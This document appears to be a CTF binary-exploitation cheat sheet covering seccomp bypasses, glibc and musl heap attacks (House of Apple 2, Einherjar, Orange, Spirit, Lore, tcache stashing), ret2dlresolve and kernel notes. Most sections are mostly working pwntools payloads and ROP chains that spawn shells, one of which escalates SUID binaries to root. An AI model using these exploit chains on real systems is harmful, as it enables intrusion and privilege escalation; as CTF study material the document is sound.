# CTF Pwn - Advanced Techniques

## Table of Contents
- [Seccomp Advanced Techniques](#seccomp-advanced-techniques)
  - [openat2 Bypass (New Age Pattern)](#openat2-bypass-new-age-pattern)
  - [Conditional Buffer Address Restrictions](#conditional-buffer-address-restrictions)
  - [Shellcode Construction Without Relocations (pwntools)](#shellcode-construction-without-relocations-pwntools)
  - [Seccomp Analysis from Disassembly](#seccomp-analysis-from-disassembly)
- [rdx Control in ROP Chains](#rdx-control-in-rop-chains)
- [House of Apple 2 — FSOP for glibc 2.34+ (0xFun 2026)](#house-of-apple-2--fsop-for-glibc-234-0xfun-2026)
  - [setcontext Variant for SUID Binaries (Midnight Flag 2026)](#setcontext-variant-for-suid-binaries-midnight-flag-2026)
- [House of Einherjar — Off-by-One Null Byte (0xFun 2026)](#house-of-einherjar--off-by-one-null-byte-0xfun-2026)
- [Use-After-Free (UAF) Exploitation](#use-after-free-uaf-exploitation)
- [Heap Exploitation](#heap-exploitation)
  - [Heap Grooming via Application Operations (Codegate 2013)](#heap-grooming-via-application-operations-codegate-2013)
- [Custom Allocator Exploitation](#custom-allocator-exploitation)
- [JIT Compilation Exploits](#jit-compilation-exploits)
- [Esoteric Language GOT Overwrite](#esoteric-language-got-overwrite)
- [Heap Overlap via Base Conversion](#heap-overlap-via-base-conversion)
- [Tree Data Structure Stack Underallocation](#tree-data-structure-stack-underallocation)
- [Classic Heap Unlink Attack (Crypto-Cat)](#classic-heap-unlink-attack-crypto-cat)
- [musl libc Heap Exploitation — Meta Pointer + atexit (UNbreakable 2026)](#musl-libc-heap-exploitation--meta-pointer--atexit-unbreakable-2026)
- [House of Orange](#house-of-orange)
- [House of Spirit](#house-of-spirit)
- [House of Lore](#house-of-lore)
- [ret2dlresolve](#ret2dlresolve)
- [tcache Stashing Unlink Attack](#tcache-stashing-unlink-attack)
- [Kernel Exploitation](#kernel-exploitation) (basic; see [kernel.md](kernel.md) for full coverage)

---

## Seccomp Advanced Techniques

### openat2 Bypass (New Age Pattern)

`openat2` (syscall 437, Linux 5.6+) frequently missed in seccomp filters blocking `open`/`openat`:
```python
# struct open_how { u64 flags; u64 mode; u64 resolve; }  = 24 bytes
# openat2(AT_FDCWD, filename, &open_how, sizeof(open_how))
```

### Conditional Buffer Address Restrictions

Seccomp `SCMP_CMP_LE`/`SCMP_CMP_GE` on buffer addresses:
- `read()` KILL if buf <= code_region + X → read to high addresses
- `write()` KILL if buf >= code_region + Y → write from low addresses

**Bypass:** Read into allowed region, `rep movsb` copy to write-allowed region:
```nasm
lea rsi, [r14 + 0xc01]   ; buf > code_region+0xc00 (passes read check)
xor rax, rax              ; __NR_read
syscall
mov r13, rax
lea rsi, [r14 + 0xc01]   ; src (high)
lea rdi, [r14 + 0x200]   ; dst (low, < code_region+0x400)
mov rcx, r13
rep movsb
mov rdi, 1
lea rsi, [r14 + 0x200]   ; buf < code_region+0x400 (passes write check)
mov rdx, r13
mov rax, 1                ; __NR_write
syscall
```

### Shellcode Construction Without Relocations (pwntools)

pwntools `asm()` fails with forward label references. Fix with manual jmp/call:

```python
body = asm('''
    pop rbx              /* rbx = address after call instruction */
    mov r14, rbx
    and r14, -4096       /* page-align for code_region base */
    mov rsi, rbx         /* filename pointer */
    /* ... rest of shellcode ... */
fail:
    mov rdi, 1
    mov rax, 60
    syscall
''')
call_offset = -(len(body) + 5)
call_instr = b'\xe8' + p32(call_offset & 0xffffffff)
jmp_instr = b'\xeb' + bytes([len(body)]) if len(body) < 128 else b'\xe9' + p32(len(body))
shellcode = jmp_instr + body + call_instr + b"filename.txt\x00"
# call pushes filename address onto stack, pop rbx retrieves it
```

### Seccomp Analysis from Disassembly

```c
seccomp_rule_add(ctx, action, syscall_nr, arg_count, ...)
```

`scmp_arg_cmp` struct: `arg` (+0x00, uint), `op` (+0x04, int), `datum_a` (+0x08, u64), `datum_b` (+0x10, u64)

SCMP_CMP operators: `NE=1, LT=2, LE=3, EQ=4, GE=5, GT=6, MASKED_EQ=7`

Default action `0x7fff0000` = `SCMP_ACT_ALLOW`

---

## rdx Control in ROP Chains

See [rop-and-shellcode.md](rop-and-shellcode.md#rdx-control-in-rop-chains) for full details and code examples.

---

## House of Apple 2 — FSOP for glibc 2.34+ (0xFun 2026)

**When to use:** Modern glibc (2.34+) removed `__free_hook`/`__malloc_hook`. House of Apple 2 uses FSOP via `_IO_wfile_jumps`.

**Full chain:** UAF → leak libc (unsorted bin fd/bk) → leak heap (safe-linking mangled NULL) → tcache poisoning to `_IO_list_all` → fake FILE → exit triggers shell.

**Fake FILE structure requirements:**
```python
fake_file = flat({
    0x00: b' sh\x00',           # _flags = " sh\x00" (fp starts with " sh")
    0x20: p64(0),                # _IO_write_base = 0
    0x28: p64(1),                # _IO_write_ptr = 1 (> _IO_write_base)
    0x88: p64(heap_addr),        # _lock (valid writable address)
    0xa0: p64(wide_data_addr),   # _wide_data pointer
    0xd8: p64(io_wfile_jumps),   # vtable = _IO_wfile_jumps
}, filler=b'\x00')

fake_wide_data = flat({
    0x18: p64(0),                # _IO_write_base = 0
    0x30: p64(0),                # _IO_buf_base = 0
    0xe0: p64(fake_wide_vtable), # _wide_vtable
})

fake_wide_vtable = flat({
    0x68: p64(libc.sym.system),  # __doallocate offset
})
```

**Trigger chain:** `exit()` → `_IO_flush_all_lockp` → `_IO_wfile_overflow` → `_IO_wdoallocbuf` → `_IO_WDOALLOCATE(fp)` → `system(fp)` where fp = `" sh\x00..."`.

**Safe-linking (glibc 2.32+):** tcache fd pointers are mangled: `fd = ptr ^ (chunk_addr >> 12)`. To poison tcache:
```python
# When writing to freed chunk, mangle the target address:
mangled_fd = target_addr ^ (current_chunk_addr >> 12)
```

### setcontext Variant for SUID Binaries (Midnight Flag 2026)

When exploiting SUID-root binaries, `system("/bin/sh")` fails because dash drops privileges when `uid != euid`. Replace the `system(fp)` target with `setcontext(fp)` to pivot to a ROP chain that calls `setuid(0)` first:

```python
# Wide vtable targets setcontext instead of system
fake_wide_vtable = flat({
    0x68: p64(libc.sym.setcontext + 61),  # __doallocate → setcontext
})

# setcontext loads registers from offsets relative to RDX (which points to fp->_wide_data):
#   RSP from [rdx+0xa0], RIP from [rdx+0xa8], RDI from [rdx+0x68]
# Place ROP chain at _wide_data structure:
fake_wide_data = flat({
    0x18: p64(0),                     # _IO_write_base = 0
    0x30: p64(0),                     # _IO_buf_base = 0
    0x68: p64(0),                     # RDI = 0 (for setuid(0))
    0xa0: p64(rop_chain_addr),        # RSP = pivot to ROP chain
    0xa8: p64(libc.sym.setuid),       # RIP = setuid as first call
    0xe0: p64(fake_wide_vtable_addr), # _wide_vtable
})

# ROP chain at rop_chain_addr:
rop = flat([
    pop_rdi_ret,
    libc.address + 0,               # After setuid(0) returns here
    # ... additional setup ...
    libc.sym.system,
    next(libc.search(b"/bin/sh\x00")),
])
```

**Trigger chain:** `exit()` → `_IO_wfile_overflow` → `_IO_wdoallocbuf` → `setcontext(fp)` → stack pivot → `setuid(0)` → `system("/bin/sh")`.

**Key insight:** `setcontext` is a universal stack pivot gadget — it loads RSP, RDI, and RIP from controlled memory, enabling arbitrary ROP execution from a FILE-based exploit. Essential for SUID binaries where dash enforces `uid == euid`.

---

## House of Einherjar — Off-by-One Null Byte (0xFun 2026)

**Vulnerability:** Off-by-one NUL at end of `malloc_usable_size` clears `PREV_INUSE` of next chunk.

**Exploit chain:**
1. Set `prev_size` of next chunk to create fake backward consolidation
2. Forge largebin-style chunk with `fd/bk` AND `fd_nextsize/bk_nextsize` all pointing to self (passes `unlink_chunk()`)
3. After consolidation, overlapping chunks enable tcache poisoning
4. Overwrite `stdout` or `_IO_list_all` for FSOP

**Key requirement:** Self-pointing unlink trick is essential. The fake chunk must pass `unlink_chunk()` which checks `FD->bk == P && BK->fd == P` and (for large chunks) `fd_nextsize->bk_nextsize == P && bk_nextsize->fd_nextsize == P`:

```python
# Fake chunk layout (at known heap address fake_addr):
#   chunk header:
#     prev_size:      don't care
#     size:           target_size | PREV_INUSE  (must match consolidation math)
#     fd:             fake_addr   (self-referencing)
#     bk:             fake_addr   (self-referencing)
#     fd_nextsize:    fake_addr   (self-referencing, needed for large chunks)
#     bk_nextsize:    fake_addr   (self-referencing)

fake_chunk = flat({
    0x00: p64(0),                # prev_size
    0x08: p64(target_size | 1),  # size with PREV_INUSE set
    0x10: p64(fake_addr),        # fd -> self
    0x18: p64(fake_addr),        # bk -> self
    0x20: p64(fake_addr),        # fd_nextsize -> self
    0x28: p64(fake_addr),        # bk_nextsize -> self
}, filler=b'\x00')

# Victim chunk's prev_size must equal distance from fake_chunk to victim
# Off-by-one NUL clears victim's PREV_INUSE bit
# free(victim) triggers backward consolidation: merges with fake_chunk
# Result: consolidated chunk overlaps other live allocations
```

**Setup sequence:**
1. Allocate chunks A (large, will hold fake chunk), B (filler), C (victim with off-by-one)
2. Write fake chunk into A with self-referencing pointers
3. Trigger off-by-one on C to clear B's PREV_INUSE and set B's prev_size
4. Free B → consolidates backward into A → overlapping chunk
5. Allocate over the overlap region to control other live chunks

---

## Use-After-Free (UAF) Exploitation

**Pattern:** Menu create/delete/view where `free()` doesn't NULL pointer.

**Classic UAF flow:**
1. Create object A (allocates chunk with function pointer)
2. Leak address via inspect/view (bypass PIE)
3. Free object A (creates dangling pointer)
4. Allocate object B of **same size** (reuses freed chunk via tcache)
5. Object B data overwrites A's function pointer with `win()` address
6. Trigger A's callback -> jumps to `win()`

**Key insight:** Both structs must be the same size for tcache to reuse the chunk.

```python
create_report("sighting-0")  # 64-byte struct with callback ptr at +56
leak = inspect_report(0)      # Leak callback address for PIE bypass
pie_base = leak - redaction_offset
win_addr = pie_base + win_offset

delete_report(0)              # Free chunk, dangling pointer remains
create_signal(b"A"*56 + p64(win_addr))  # Same-size struct overwrites callback
analyze_report(0)             # Calls dangling pointer -> win()
```

---

## Heap Exploitation

- tcache poisoning (glibc 2.26+)
- fastbin dup / double free
- House of Force (old glibc)
- Unsorted bin attack
- Check glibc version: `strings libc.so.6 | grep GLIBC`

**Heap info leaks via uninitialized memory:**
- Error messages outputting user data may include freed chunk metadata
- Freed chunks contain libc pointers (fd/bk in unsorted bin)
- Missing null-termination in sprintf/strcpy leaks adjacent memory
- Trigger error conditions to leak libc/heap base addresses

**Heap feng shui:**
- Arrange heap layout by controlling allocation order/sizes
- Create holes of specific sizes by allocating then freeing
- Place target structures adjacent to overflow source
- Use spray patterns with incremental offsets (e.g., 0x200 steps)

### Heap Grooming via Application Operations (Codegate 2013)

**Pattern:** Multi-step application-level operations (create/reply/delete in a board, forum, or note app) to achieve controlled heap state for exploitation.

**Technique:**
1. Create N entries with overflow payloads in author/title/content fields
2. Fill reply buffers for each entry (e.g., 127 replies of `"sh"`) to place controlled data at predictable heap locations
3. Selectively delete entries to create specific heap holes
4. Allocate new entries that land in freed chunks, overlapping with surviving metadata

```python
# Example: Codegate 2013 Vuln 400 — board-based heap grooming
# Step 1: Create 7 posts with overflow in content field
for i in range(7):
    create_post("YOLO", "YOLO",
        "A" * 36 + pack("I", got_addr) +    # Author overflow
        "A" * 604 + pack("I", got_addr) +    # Content overflow
        pack("I", plt_addr) * 80)            # Spray GOT targets

# Step 2: Fill reply buffers to heap-spray "sh" strings
for i in range(7):
    for j in range(127):
        reply_to_post(i, "sh")

# Step 3: Delete 5 of 7 to create specific heap holes
for i in [0, 1, 2, 3, 4]:
    delete_post(i)

# Step 4: Allocate 2 new entries into freed space
create_post(payload_a, payload_b, payload_c)
create_post(payload_d, payload_e, payload_f)

# Step 5: Trigger via modify + delete sequence
modify_post(target_id, trigger_payload)
delete_post(target_id)  # Triggers GOT overwrite → shell
```

**Key insight:** Application operations (create, reply, delete, modify) map to heap allocations and frees of predictable sizes. By controlling the sequence and count of operations, you achieve the same effect as direct heap manipulation but through the application's own interface.

## Custom Allocator Exploitation

Applications may use custom allocators (nginx pools, Apache apr, game engines):

**nginx pool structure:**
- Pools chain allocations with destructor callbacks
- `ngx_destroy_pool()` iterates cleanup handlers
- Overflow to overwrite destructor function pointer + argument
- When pool freed, calls `system(controlled_string)`

**General approach:**
1. Reverse engineer allocator metadata layout
2. Find destructor/callback pointers in structures
3. Overflow to corrupt pointer + first argument
4. Trigger deallocation to call controlled function

```python
# nginx pool exploit pattern
payload = flat({
    0x00: cmd * (0x800 // len(cmd)),      # Command string
    0x800: [libc.sym.system, HEAP + OFF] * 0x80,  # Destructor spray
    0x1010: [0x1020, 0x1011],              # Pool metadata
    0x1010+0x50: [HEAP + OFF + 0x800]      # Cleanup handler ptr
}, length=0x1200)
```

## JIT Compilation Exploits

**Pattern (Santa's Christmas Calculator):** Off-by-one in instruction encoding causes misaligned machine code.

**Exploitation flow:**
1. Find the boundary value that triggers wrong instruction form (e.g., 128 vs 127)
2. Misaligned bytes become executable instructions
3. Control `rax` to survive invalid dereferences (point to writable memory)
4. Embed shellcode as operand bytes of subtraction operations
5. Chain 4-byte shellcode blocks with 2-byte `jmp` instructions between them

**2-byte instruction shellcode tricks:**
- `push rdx; pop rsi` = `mov rsi, rdx` in 2 bytes
- `xor eax, eax` = 2 bytes (set syscall number)
- `not dl` = 2 bytes (adjust pointer)
- Use `sys_read` to stage full shellcode on RWX page, then jump to it

## Esoteric Language GOT Overwrite

**Pattern (Pikalang):** Brainfuck/Pikalang interpreter with unbounded tape allows arbitrary memory access.

**Exploitation:**
1. Tape pointer starts at known buffer address
2. Move pointer backward/forward to reach GOT entry (e.g., `strlen@GOT`)
3. Overwrite GOT entry byte-by-byte with `system()` address
4. Next call to overwritten function triggers `system(controlled_string)`

**Key insight:** Unbounded tape = arbitrary read/write primitive relative to buffer base.

## Heap Overlap via Base Conversion

**Pattern (Santa's Base Converter):** Number stored as string in different bases has different lengths.

**Exploitation:**
1. Store number in base with short representation (e.g., base-36)
2. Convert to base with longer representation (e.g., base-2/binary)
3. Longer string overflows into adjacent heap chunk metadata
4. Corrupted chunk overlaps with target allocation

**Limited charset constraint:** Only digits/letters available (0-9, a-z) limits writable byte values.

## Tree Data Structure Stack Underallocation

**Pattern (Christmas Trees):** Imbalanced binary tree causes stack buffer underallocation.

**Vulnerability:** Stack allocation based on balanced tree assumption (`2^depth` nodes), but actual traversal of imbalanced tree uses more stack than allocated buffer, causing overflow.

**Exploitation:** Craft tree structure that causes traversal to overflow buffer → overwrite return address → ret2win (partial overwrite if PIE).

---

## Classic Heap Unlink Attack (Crypto-Cat)

**When to use:** Old glibc (< 2.26, no tcache) or educational heap challenges. Overflow one heap chunk's metadata to corrupt the next chunk's `prev_size` and `size` fields, then trigger an unlink during `free()` that writes an arbitrary value to an arbitrary address.

**How dlmalloc unlink works:**
```c
// When free() consolidates with an adjacent free chunk:
// FD = P->fd, BK = P->bk
// FD->bk = BK    (write BK to FD + offset)
// BK->fd = FD    (write FD to BK + offset)
// This is a write-what-where primitive
```

**Exploit pattern:**
1. Allocate two adjacent chunks (A and B)
2. Overflow A's data into B's chunk header:
   - Set B's `prev_size` to A's data size (fake "previous chunk is free")
   - Clear B's `PREV_INUSE` bit in `size` field
   - Craft fake `fd` and `bk` pointers in A's data area
3. Free B → `free()` thinks A is also free, triggers backward consolidation → unlink on fake chunk

```python
from pwn import *

# Fake chunk in A's data region
fake_fd = target_addr - 0x18  # GOT entry - 3*sizeof(ptr)
fake_bk = target_addr - 0x10  # GOT entry - 2*sizeof(ptr)

# Overflow from A into B's header
payload = p64(0)              # fake prev_size for A
payload += p64(data_size)     # fake size for A (marks A as "free")
payload += p64(fake_fd)       # fd pointer
payload += p64(fake_bk)       # bk pointer
payload += b'A' * (data_size - 32)  # fill A's data
payload += p64(data_size)     # overwrite B's prev_size
payload += p64(b_size & ~1)   # overwrite B's size, clear PREV_INUSE bit

# After free(B): target_addr now contains a pointer we control
```

**Modern mitigations:** glibc 2.26+ added safe-unlinking checks (`FD->bk == P && BK->fd == P`). For modern heaps, use tcache poisoning, House of Apple 2, or House of Einherjar instead.

**Key insight:** The unlink macro performs two pointer writes. By controlling `fd` and `bk` in a fake chunk, you get a constrained write-what-where: each location gets the other's value. Classic use: overwrite a GOT entry with the address of a win function or shellcode.

---

## musl libc Heap Exploitation — Meta Pointer + atexit (UNbreakable 2026)

**Pattern (atypical-heap):** Binary linked against musl libc (not glibc). musl's allocator uses `meta` structures instead of chunk headers. OOB read leaks `meta->mem` pointer; arbitrary write redirects allocation to controlled address.

**musl allocator layout:**
- Each allocation belongs to a `group`, managed by a `meta` struct
- `meta->mem` points to the group's data region
- First `0x70`-class allocation places `meta0->mem` at a fixed offset from PIE base (e.g., `chall_base + 0x3f20`)

**Exploitation chain:**
1. **Leak meta pointer** — OOB read at offset `0x80` from a heap allocation reads the `meta` struct pointer
2. **Recover PIE base** — `meta0->mem` is at a fixed offset from the binary base
3. **Redirect allocation** — Overwrite `meta->mem` to point at a live group or target address. Next allocation from that group returns attacker-controlled memory
4. **atexit hijack** — Overwrite musl's `atexit` handler list with `system("cat flag")`. Normal program exit triggers code execution

```python
# Leak meta pointer via OOB read
meta_ptr = leak_at_offset(0x80)
pie_base = meta_ptr - 0x3f20  # fixed offset for first 0x70 allocation

# Rewrite meta->mem to redirect future allocations
write_at(meta_ptr + META_MEM_OFFSET, target_addr)

# Next alloc returns target_addr — use to overwrite atexit handlers
alloc_and_write(atexit_list_addr, system_addr, "cat flag")
```

**Key insight:** musl's allocator metadata (`meta` structs) is stored separately from heap data, but predictable offsets link them to the binary base. Unlike glibc, musl has no safe-linking or tcache — corrupting `meta->mem` gives direct allocation control. The `atexit` handler list is a simpler code execution target than glibc's `__free_hook` (which is removed in 2.34+).

**Detection:** Binary uses musl libc (check `ldd`, or `strings binary | grep musl`). Menu-style heap challenges with read/write primitives.

---

## House of Orange

**Pattern:** Trigger unsorted bin allocation without calling `free()`. Overwrite the top chunk size to a small value via heap overflow. Next large allocation fails the top chunk, forces `sysmalloc` to free the old top chunk into unsorted bin. Then corrupt the freed chunk for FSOP or tcache attack.

```python
# Step 1: Overflow to corrupt top chunk size
# Top chunk must have PREV_INUSE set and size aligned to page
# Size must be < MINSIZE away from page boundary
edit(0, b'A' * overflow_len + p64(0xc01))  # Fake small top chunk

# Step 2: Request larger than corrupted top size
# Forces sysmalloc → old top freed into unsorted bin
add(0x1000, b'B')  # Triggers the free

# Step 3: Unsorted bin attack or FSOP from here
# Overwrite _IO_list_all via unsorted bin's bk pointer
```

**Key insight:** House of Orange creates a free chunk without ever calling `free()` — essential when the binary has no delete/free functionality. The corrupted top chunk size must satisfy: `(size & 0xFFF) == 0` (page-aligned end), `size >= MINSIZE`, and `PREV_INUSE` bit set.

**Requirements:** Heap overflow that can reach top chunk metadata. glibc < 2.26 for classic variant; modern versions need FSOP chain (House of Apple 2).

---

## House of Spirit

**Pattern:** Forge a fake chunk in attacker-controlled memory (stack, .bss, or heap), then `free()` it to get it into a bin. Next allocation of that size returns the fake chunk, giving write access to the target area.

```python
# Forge fake fastbin chunk on the stack
# Need valid size field and next chunk's size for validation
fake_chunk = flat(
    0,              # prev_size
    0x41,           # size (0x40 + PREV_INUSE) — must match target fastbin
    0, 0, 0, 0, 0, 0,  # data area (8 qwords for 0x40 chunk)
    0,              # next chunk prev_size
    0x41,           # next chunk size (passes free() validation)
)

# Write fake chunk address somewhere the binary will free()
# e.g., overwrite a pointer that gets passed to free()
overwrite_ptr(target_ptr, addr_of_fake_chunk + 0x10)

# Trigger free(target_ptr) → fake chunk enters fastbin
trigger_free()

# Next malloc(0x38) returns our fake chunk → write to controlled area
malloc_and_write(0x38, payload)
```

**Key insight:** The key constraint is that `free()` validates the size of the chunk AND the size of the "next" chunk (at `chunk + size`). Both must look valid — sizes in fastbin range (0x20-0x80 on 64-bit), with proper alignment and flags.

---

## House of Lore

**Pattern:** Corrupt a smallbin chunk's `bk` pointer to point to a fake chunk in attacker-controlled memory. When the smallbin is used for allocation, the fake chunk gets linked into the bin. A second allocation returns the fake chunk, giving arbitrary write.

```python
# Step 1: Free a chunk into smallbin (via unsorted bin → sorted)
free(chunk_a)
malloc(large_size)  # Forces sorting: chunk_a moves to smallbin

# Step 2: Forge fake chunk in target area
# fake->fd must point back to the real smallbin chunk
# fake->bk must point to another valid-looking chunk (or same)
fake = flat(
    0, 0x91,                    # prev_size, size
    addr_of_real_chunk,         # fd → points back to legitimate chunk
    addr_of_fake2,              # bk → another fake or self
)

# Step 3: Overwrite chunk_a->bk to point to our fake chunk
edit_freed_chunk(chunk_a, bk=addr_of_fake)

# Step 4: Two allocations from this smallbin
alloc1 = malloc(0x80)  # Returns chunk_a (legitimate)
alloc2 = malloc(0x80)  # Returns our fake chunk → arbitrary write!
```

**Key insight:** Requires corrupting `bk` of a freed smallbin chunk. The fake chunk's `fd` must point back to a chunk whose `bk` points to the fake — glibc checks `victim->bk->fd == victim`. On older glibc this check is weaker.

---

## ret2dlresolve

**Pattern:** Forge `Elf64_Sym` and `Elf64_Rela` structures to trick the dynamic linker into resolving an arbitrary function (e.g., `system`) at the next PLT call. Bypasses ASLR without any libc leak.

```python
from pwn import *

# pwntools has built-in ret2dlresolve support
rop = ROP(elf)
dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])

rop.read(0, dlresolve.data_addr)  # Read forged structures to known address
rop.ret2dlresolve(dlresolve)       # Trigger resolution

# Stage 1: Send ROP chain
io.sendline(flat({offset: rop.chain()}))

# Stage 2: Send forged dl-resolve payload
io.sendline(dlresolve.payload)
```

**Manual approach (understanding the internals):**
```python
# Forge at a writable address (e.g., .bss)
# 1. Fake Elf64_Rela: points PLT slot to our fake Elf64_Sym
# 2. Fake Elf64_Sym: st_name offset points to our "system" string
# 3. "system\x00" string

SYMTAB = elf.dynamic_value_by_tag('DT_SYMTAB')
STRTAB = elf.dynamic_value_by_tag('DT_STRTAB')
JMPREL = elf.dynamic_value_by_tag('DT_JMPREL')

# Calculate reloc_index so PLT stub pushes correct index
reloc_index = (fake_rela_addr - JMPREL) // 0x18  # sizeof(Elf64_Rela)

# Fake Elf64_Sym.st_name = offset from STRTAB to our "system" string
fake_sym_st_name = fake_string_addr - STRTAB
```

**Key insight:** ret2dlresolve works without ANY leak. It exploits the lazy binding mechanism: when a PLT function is called for the first time, the dynamic linker looks up the symbol name and resolves it. By forging the lookup structures, you can make it resolve any libc function. Use pwntools' `Ret2dlresolvePayload` for automation.

**Requirements:** Partial RELRO (Full RELRO resolves all symbols at load time, defeating this). Writable memory to place forged structures.

---

## tcache Stashing Unlink Attack

**Pattern:** Exploit tcache's interaction with smallbin during `malloc()`. When tcache for a size is not full, `malloc()` from smallbin will "stash" remaining smallbin chunks into tcache. During stashing, the `bk` pointer is followed without full validation, allowing arbitrary address to be linked into tcache.

```python
# Setup: Need 7 chunks in tcache (to later drain) + 2 in smallbin
# The 2nd smallbin chunk has corrupted bk → target address

# Step 1: Fill tcache with 7 chunks, then free 2 more into smallbin
for i in range(7):
    free(tcache_chunks[i])
# These two go to unsorted → smallbin after sorting
free(smallbin_chunk_1)
free(smallbin_chunk_2)
malloc(large)  # Sort unsorted bin → chunks enter smallbin

# Step 2: Drain tcache
for i in range(7):
    malloc(target_size)

# Step 3: Corrupt smallbin_chunk_2->bk to point to (target_addr - 0x10)
# target_addr - 0x10 because tcache stores user data pointer at chunk+0x10
edit_after_free(smallbin_chunk_2, bk=target_addr - 0x10)

# Step 4: Allocate from smallbin
# malloc returns smallbin_chunk_1
# Stashing mechanism follows bk chain:
#   smallbin_chunk_2 gets stashed into tcache
#   Then follows corrupted bk → target gets stashed into tcache too!
malloc(target_size)

# Step 5: Next two mallocs: first returns smallbin_chunk_2, second returns target
malloc(target_size)  # Returns chunk_2
malloc(target_size)  # Returns target_addr → arbitrary write!
```

**Key insight:** During stashing, glibc sets `bck->fd = bin` (where `bck = victim->bk`), effectively writing a main_arena pointer to `target_addr`. This is a powerful write-what-where primitive. The written value is a heap/libc address (not fully controlled), but it's enough to corrupt FILE structures, tcache metadata, or other heap state.

**Requirements:** glibc 2.29+ (tcache + smallbin interaction). Ability to corrupt a freed smallbin chunk's `bk` pointer.

---

## Kernel Exploitation

For comprehensive kernel exploitation techniques, see [kernel.md](kernel.md). Quick reference:

- `modprobe_path` overwrite for root code execution (requires AAW)
- `tty_struct` kROP via fake vtable and stack pivot
- `userfaultfd` for deterministic race conditions
- Heap spray with `tty_struct`, `poll_list`, `user_key_payload`, `seq_operations`
- KASLR/FGKASLR/SMEP/SMAP/KPTI bypass techniques
- Kernel config recon checklist

**Basic patterns (userland-adjacent):**
- OOB via vulnerable `lseek` handlers
- Heap grooming with forked processes
- SUID binary exploitation via kernel-to-userland buffer overflow
- Check kernel config for disabled protections:
  - `CONFIG_SLAB_FREELIST_RANDOM=n` → sequential heap chunks
  - `CONFIG_SLAB_MERGE_DEFAULT=n` → predictable allocations
